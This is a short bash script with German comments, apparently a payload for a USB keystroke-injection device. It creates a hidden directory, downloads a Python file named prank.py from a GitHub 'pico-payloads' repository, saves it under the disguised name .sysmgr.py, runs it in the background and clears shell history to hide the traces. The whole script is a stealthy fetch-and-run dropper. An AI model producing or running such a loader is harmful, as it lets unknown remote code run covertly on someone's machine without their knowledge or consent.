#!/bin/bash

# Verstecktes Verzeichnis
mkdir -p ~/.local/share/.cache 2>/dev/null
cd ~/.local/share/.cache

# Python Script von GitHub holen
curl -sL https://raw.githubusercontent.com/Nepflo/pico-payloads/main/prank.py -o .sysmgr.py

# Ausführen
python3 .sysmgr.py &

# Aufräumen (optional)
history -c
exit
